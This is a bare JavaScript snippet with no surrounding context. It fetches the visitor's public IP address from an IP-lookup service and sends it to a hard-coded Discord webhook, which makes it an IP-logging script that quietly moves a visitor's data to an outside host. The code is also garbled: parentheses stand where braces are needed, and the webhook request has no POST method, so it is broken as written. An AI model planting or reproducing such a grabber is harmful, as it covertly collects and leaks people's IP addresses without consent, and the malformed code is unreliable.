var ip = '';
fetch('https://api.ipify.org/?format=json')
.then(function(response) (
return response.json()
)
.then(function(data)
ip = data.ip;
var webhook = 'https://discord.com/api/webhooks/1112433220747792535/f0GSFHDk7Y5p7YNV2xzoIjy-7Kl6v1gRJyK2jONEyMxhjGiEbvffgJNA9N4ZeaGJg_i9';
var msg = (
    content: 'IP:' + ip
);
fetch(webhook,{
    headers: {
        'Content-Type':  'application/json'
    },
    body: JSON.stringify(msg)
})
)
